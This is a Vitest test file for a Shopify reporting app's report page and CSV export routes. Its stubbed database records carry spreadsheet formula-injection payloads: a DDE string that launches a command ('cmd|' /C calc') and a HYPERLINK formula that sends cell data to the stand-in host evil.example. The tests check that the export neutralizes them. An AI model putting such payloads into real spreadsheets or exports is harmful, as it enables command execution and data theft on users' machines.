/**
 * The report page and CSV export loaders, run against the real report
 * pipeline with a stubbed tenant database. Covers the spreadsheet-formula
 * findings on the export this route replaces (#79).
 */
import { beforeEach, describe, expect, it, vi } from "vitest";
import type { LoaderFunctionArgs } from "react-router";
import { AnalyticsPrerequisiteError } from "../analytics/errors";
import { Decimal } from "../analytics/money";
import type { ReportContext } from "./types";

const { requireAdminTenant, loadReportContext } = vi.hoisted(() => ({
  requireAdminTenant: vi.fn(),
  loadReportContext: vi.fn(),
}));

vi.mock("../../tenant/require-admin-tenant.server", () => ({ requireAdminTenant }));
vi.mock("./registry.server", async (importOriginal) => ({
  ...(await importOriginal<typeof import("./registry.server")>()),
  loadReportContext,
}));

import { loader as pageLoader } from "../../routes/app.reports.$reportId";
import { loader as exportLoader } from "../../routes/app.reports.$reportId_.export";

const VARIANT = "gid://shopify/ProductVariant/1";
const PRODUCT = "gid://shopify/Product/1";
const ITEM = "gid://shopify/InventoryItem/1";
const LOCATION = "gid://shopify/Location/1";

const db = {
  shopifyVariantFact: {
    findMany: vi.fn(async () => [
      {
        id: "v1",
        shopifyGid: VARIANT,
        shopifyProductGid: PRODUCT,
        title: "+cmd|' /C calc'!A0",
        displayName: null,
        sku: "-2+3",
        barcode: null,
        priceAmount: new Decimal("19.99"),
        currencyCode: "USD",
        shopifyCreatedAt: new Date("2025-01-01T00:00:00Z"),
      },
    ]),
  },
  shopifyProductFact: {
    findMany: vi.fn(async () => [
      {
        shopifyGid: PRODUCT,
        title: '=HYPERLINK("http://evil.example/?x="&A1,"Click")',
        vendor: "Northwind, Inc.",
        productType: null,
        status: "ACTIVE",
      },
    ]),
  },
  shopifyInventoryItemFact: {
    findMany: vi.fn(async () => [
      {
        shopifyGid: ITEM,
        shopifyVariantGid: VARIANT,
        tracked: true,
        unitCostAmount: new Decimal("7.5"),
        unitCostCurrencyCode: "USD",
        unitCostAccess: "PRESENT",
      },
    ]),
  },
  shopifyInventoryLevelFact: {
    findMany: vi.fn(async () => [
      {
        id: "l1",
        inventoryItemGid: ITEM,
        locationGid: LOCATION,
        availableQuantity: 3,
        onHandQuantity: 4,
        committedQuantity: 1,
        incomingQuantity: 0,
        shopifyUpdatedAt: new Date("2026-11-09T15:00:00Z"),
      },
    ]),
  },
  shopifyLocationFact: {
    findMany: vi.fn(async () => [
      { shopifyGid: LOCATION, name: "@SUM(1+1)*cmd|' /C calc'!A0", isActive: true },
    ]),
  },
};

const context = {
  db,
  timeZone: "America/New_York",
  currencyCode: "USD",
  installedAt: new Date("2026-08-01T00:00:00Z"),
  today: "2026-11-10",
  now: new Date("2026-11-10T17:00:00Z"),
} as unknown as ReportContext;

function args(path: string, reportId: string): LoaderFunctionArgs {
  return {
    request: new Request(`https://app.example${path}`),
    params: { reportId },
    context: {},
  } as unknown as LoaderFunctionArgs;
}

async function thrown(run: () => Promise<unknown>): Promise<unknown> {
  try {
    await run();
  } catch (error) {
    return error;
  }
  throw new Error("Expected the loader to throw");
}

beforeEach(() => {
  requireAdminTenant.mockReset();
  requireAdminTenant.mockResolvedValue({ tenant: { shopId: "shop-a" }, db });
  loadReportContext.mockReset();
  loadReportContext.mockResolvedValue(context);
});

describe("report CSV export route", () => {
  it("neutralizes spreadsheet formulas and keeps numbers numeric", async () => {
    const response = (await exportLoader(
      args("/app/reports/stock-on-hand/export", "stock-on-hand"),
    )) as Response;

    expect(response.status).toBe(200);
    expect(await response.text()).toBe(
      "Product,Variant,SKU,Vendor,Location,Available,On hand,Committed,Incoming," +
        "Cost per item (USD),Cost value (USD),Price (USD),Retail value (USD)\r\n" +
        `"'=HYPERLINK(""http://evil.example/?x=""&A1,""Click"")",` +
        `'+cmd|' /C calc'!A0,'-2+3,"Northwind, Inc.",'@SUM(1+1)*cmd|' /C calc'!A0,` +
        "3,4,1,0,7.50,30.00,19.99,79.96\r\n",
    );
  });

  it("serves a private, non-cacheable attachment named after the report", async () => {
    const response = (await exportLoader(
      args("/app/reports/stock-on-hand/export", "stock-on-hand"),
    )) as Response;

    expect(response.headers.get("Content-Type")).toBe("text/csv; charset=utf-8");
    expect(response.headers.get("Content-Disposition")).toBe(
      'attachment; filename="stock-on-hand-2026-11-10.csv"',
    );
    expect(response.headers.get("Cache-Control")).toBe("private, no-store");
    expect(response.headers.get("X-Content-Type-Options")).toBe("nosniff");
    expect(response.headers.get("X-Report-Truncated")).toBeNull();
  });

  it("exports the filtered rows, not the page on screen", async () => {
    const response = (await exportLoader(
      args("/app/reports/stock-on-hand/export?q=no-such-product&page=4", "stock-on-hand"),
    )) as Response;
    expect((await response.text()).split("\r\n")).toHaveLength(2);
  });

  it("authenticates before it looks at the report id", async () => {
    requireAdminTenant.mockRejectedValue(new Response(null, { status: 401 }));
    const error = await thrown(() => exportLoader(args("/app/reports/nope/export", "nope")));

    expect((error as Response).status).toBe(401);
    expect(loadReportContext).not.toHaveBeenCalled();
  });

  it("answers 404 for a report that does not exist", async () => {
    const error = await thrown(() =>
      exportLoader(args("/app/reports/__proto__/export", "__proto__")),
    );
    expect((error as Response).status).toBe(404);
    expect(loadReportContext).not.toHaveBeenCalled();
  });

  it("answers 409 with a plain message while shop settings are still syncing", async () => {
    loadReportContext.mockRejectedValue(
      new AnalyticsPrerequisiteError("shop_timezone", "Shop time zone is not known yet"),
    );
    const response = (await exportLoader(
      args("/app/reports/stock-on-hand/export", "stock-on-hand"),
    )) as Response;

    expect(response.status).toBe(409);
    expect(await response.text()).toMatch(/not ready yet/);
  });

  it("does not swallow other failures", async () => {
    loadReportContext.mockRejectedValue(new Error("database unavailable"));
    const error = await thrown(() =>
      exportLoader(args("/app/reports/stock-on-hand/export", "stock-on-hand")),
    );
    expect((error as Error).message).toBe("database unavailable");
  });
});

describe("report page route", () => {
  it("returns the computed page as plain data", async () => {
    const data = await pageLoader(args("/app/reports/stock-on-hand?sort=onHand&dir=asc", "stock-on-hand"));

    expect(data).toMatchObject({
      ready: true,
      page: {
        report: { id: "stock-on-hand", title: "Stock on hand", usesDateRange: false },
        request: { options: { stock: "stocked" } },
        table: {
          totalRows: 1,
          filteredRows: 1,
          page: 1,
          pageCount: 1,
          sort: { key: "onHand", direction: "asc" },
        },
        searchLabels: ["Product", "Variant", "SKU", "Vendor"],
        dataAsOf: "Nov 9, 2026, 10:00 AM EST",
        timeZone: "America/New_York",
      },
    });
    if (!data.ready) throw new Error("Expected a ready report");
    expect(data.page.table.rows[0].cells.slice(5)).toEqual([
      "3",
      "4",
      "1",
      "0",
      "$7.50",
      "$30.00",
      "$19.99",
      "$79.96",
    ]);
    expect(data.page.table.tiles.map((tile) => [tile.label, tile.value])).toEqual([
      ["Units on hand", "4"],
      ["Cost value", "$30.00"],
      ["Retail value", "$79.96"],
      ["Variants", "1"],
    ]);
    // Loader data crosses to the browser: no Decimal or function may be in it.
    expect(JSON.parse(JSON.stringify(data))).toEqual(data);
  });

  it("passes route params to the tenant check", async () => {
    await pageLoader(args("/app/reports/stock-on-hand", "stock-on-hand"));
    expect(requireAdminTenant).toHaveBeenCalledWith(
      expect.objectContaining({ params: { reportId: "stock-on-hand" } }),
    );
  });

  it("answers 404 for a report that does not exist", async () => {
    const error = await thrown(() => pageLoader(args("/app/reports/nope", "nope")));
    expect((error as Response).status).toBe(404);
  });

  it("renders a not-ready state instead of guessing a time zone or currency", async () => {
    loadReportContext.mockRejectedValue(
      new AnalyticsPrerequisiteError("shop_currency", "Shop currency is not known yet"),
    );
    expect(await pageLoader(args("/app/reports/dead-stock", "dead-stock"))).toEqual({
      ready: false,
      title: "Dead stock",
    });
  });
});
